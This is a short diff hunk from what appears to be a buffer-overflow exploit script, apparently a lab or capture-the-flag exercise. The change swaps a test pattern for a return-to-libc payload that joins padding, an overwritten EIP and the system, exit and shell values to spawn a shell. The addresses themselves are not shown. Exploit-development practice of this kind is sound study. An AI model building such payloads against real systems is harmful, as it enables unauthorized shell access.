@@ -12,6 +12,6 @@ while (ch <= "T"):
     padding += ch*4
     ch = chr(ord(ch) + 1)
 
-print(padding+eip+"AAAA"+"BBBB"+"CCCC")
+#print(padding+eip+"AAAA"+"BBBB"+"CCCC")
 
-#print(padding+eip+sys+ex+sh)
+print(padding+eip+sys+ex+sh)
